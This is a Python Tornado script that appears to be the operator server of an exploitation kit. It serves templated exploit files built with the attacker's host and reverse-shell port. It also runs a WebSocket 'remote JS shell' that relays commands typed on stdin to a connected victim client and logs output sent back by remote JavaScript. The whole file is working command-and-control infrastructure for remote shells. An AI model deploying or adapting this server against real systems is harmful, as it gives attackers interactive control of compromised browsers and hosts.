#!/usr/bin/env python3

from tornado import websocket, web, ioloop, template
from tornado.tcpserver import TCPServer
from tornado.iostream import StreamClosedError

import importlib.util
import socket
import sys
import os

from config import *

# Currently active shell. Either a JS shell or a reverse shell (bash)
active_shell = None

class LogHandler(websocket.WebSocketHandler):
    def open(self):
        print("[LOG] Remote JS logging connection establised")

    def on_message(self, msg):
        print("[LOG] " + msg)

class WSShellHandler(websocket.WebSocketHandler):
    def open(self):
        global active_shell
        active_shell = lambda msg: self.write_message(msg)
        print("[WSSH] Remote JS shell establised")

    def on_close(self):
        global active_shell
        active_shell = None
        print("[WSSH] Remote JS shell closed")

    def on_message(self, msg):
        print(msg)

class BaseFileHandler(web.RequestHandler):
    def initialize(self, path, content_type, is_template):
        self.path = path
        self.content_type = content_type
        self.is_template = is_template

    def get(self):
        print("[HTTP] Serving file {}".format(self.path))

        self.set_status(200)
        self.set_header('Content-Type', self.content_type)
        self.set_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.set_header('Pragma', 'no-cache')

        with open(self.path, 'rb') as f:
            content = f.read()
            if self.is_template:
                t = template.Template(content)
                content = t.generate(host=HOST, http_port=HTTP_PORT, revshell_port=REVSHELL_PORT)
            self.write(content)

        self.finish()

class StaticFileHandler(BaseFileHandler):
    def initialize(self, path, content_type):
        super().initialize(path, content_type, False)

class TemplateFileHandler(BaseFileHandler):
    def initialize(self, path, content_type):
        super().initialize(path, content_type, True)

def stdin_handler(fd, events):
    command = fd.readline()
    if active_shell:
        active_shell(command)

if __name__ == '__main__':
    # Prepare routes from the subdirectories
    routes = []
    spec = importlib.util.spec_from_file_location('./', 'make.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)

    for entry in module.EXPORTS:
        is_template = 'is_template' in entry and entry['is_template']
        args = {'path': './{}'.format(entry['path']),
                'content_type': entry['content_type']}

        paths = [entry['path']]
        if 'aliases' in entry:
            paths += entry['aliases']
        for path in paths:
            handler = StaticFileHandler if not is_template else TemplateFileHandler
            routes.append((r'/' + path, handler, args))

    routes.append((r'/logging', LogHandler))
    routes.append((r'/shell', WSShellHandler))

    # Start all services
    app = web.Application(routes, compress_reponse=True)
    app.listen(HTTP_PORT, HOST)

    ioloop.IOLoop.instance().add_handler(sys.stdin, stdin_handler, ioloop.IOLoop.READ)

    print("Server listening on {}:{}".format(HOST, HTTP_PORT))

    try:
        ioloop.IOLoop.instance().start()
    except KeyboardInterrupt:
        print("Bye")
